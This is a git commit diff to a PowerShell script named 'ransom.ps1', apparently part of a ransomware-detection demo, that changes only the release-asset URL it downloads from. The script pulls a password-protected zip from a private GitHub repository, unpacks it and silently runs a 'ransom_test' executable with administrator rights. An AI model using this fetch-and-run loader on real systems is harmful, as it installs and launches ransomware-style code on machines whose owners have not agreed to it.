f7b8a49db6ec93a79c7c3c8fb6d2ab3fccfb1fb4
crjptpp <119838914+crjptpp@users.noreply.github.com>
2022-12-06 17:52:26 +0900

    Update ransom.ps1

--- sedemo01/ransom.ps1
+++ sedemo01/ransom.ps1
@@ -1,4 +1,4 @@
-$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81659605" -Headers $headers -OutFile $env:TEMP\ransom_test.zip
+$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/crjptpp/tools_private/releases/assets/87167769" -Headers $headers -OutFile $env:TEMP\ransom_test.zip
 cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\ransom_test.zip'
 Remove-Item $env:TEMP\ransom_test.zip
 Start-Process -FilePath $env:TEMP\ransom_test_v???.exe -Args "/S" -Verb RunAs -Wait
